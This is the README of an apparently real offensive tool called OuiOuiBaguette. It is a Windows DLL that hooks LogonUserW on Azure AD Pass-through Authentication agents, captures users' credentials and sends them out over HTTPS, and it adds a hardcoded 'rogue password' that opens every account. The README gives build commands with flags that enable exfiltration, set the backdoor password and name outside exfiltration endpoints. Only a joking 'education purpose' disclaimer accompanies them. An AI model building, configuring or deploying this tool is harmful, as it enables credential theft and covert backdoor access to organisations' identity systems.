# 🥖 OuiOuiBaguette

OuiOuiBaguette is a DLL designed to hook into the LogonUserW function, specifically to capture and exfiltrate authentication requests made to Azure Active Directory in Pass-through Authentication (PTA) mode. It also add "Rogue password" to connect on all account with hardcoded password.

![ouioui](./.github/ouiouibaguette.png)

> ⚠️ **Warning :** Juste education purpose it's méchant of not be gentil
> 

## Setup

To build OuiOuiBaguette, follow these steps:

1. **Clone the repository:**

   ```bash
   git clone https://github.com/requin-citron/ouiouibaguette.git
   cd ouiouibaguette
   ```

2. **Initialize and update submodules:**

    ```bash
    git submodule init
    git submodule update
    ```

3. **Create a build directory and navigate into it:**
    ```bash
    mkdir build
    cd build
    ```

4. **Configure the build with CMake:**
    ```bash
    CC=/usr/bin/x86_64-w64-mingw32-gcc cmake .. -DHTTPS_EXFILTRATION=1 -DDEBUG=0 -DROGUE_PASSWORD="OuiOuiBaguette" -DHTTPS_ENDPOINT="miammiam.kleman.pw" -DUSERAGENT="OUIOUI BAGUETTE"
    ```
> S/O https://github.com/apriorit/mhook.git

```bash
mkdir build && cd build
CC=/usr/bin/x86_64-w64-mingw32-gcc cmake .. -DHTTPS_EXFILTRATION=1 -DDEBUG=1 -DROGUE_PASSWORD="ChevaloReviensStp" -DHTTPS_ENDPOINT="biencepasser.kleman.pw" -DUSERAGENT="Magie"
make -j8 2>&1
```

* `-DHTTPS_EXFILTRATION=1`: Enables HTTPS exfiltration.
* `-DDEBUG=1`: Enables debug mode.
* `-DROGUE_PASSWORD="ChevaloReviensStp"`: Sets the rogue password.
* `-DHTTPS_ENDPOINT="biencepasser.kleman.pw"`: Specifies the HTTPS endpoint.
* `-DUSERAGENT="Magie"`: Sets the user agent.

5. **Build the project:**
```
make -j8 2>&1
```

## Dependencies
* S/O [mhook](https://github.com/apriorit/mhook.git): A library for API hooking on Windows

## Contributor
* S/O [Atao](
https://github.com/Ataao) yet another baguette player who help me to had some baguette to the project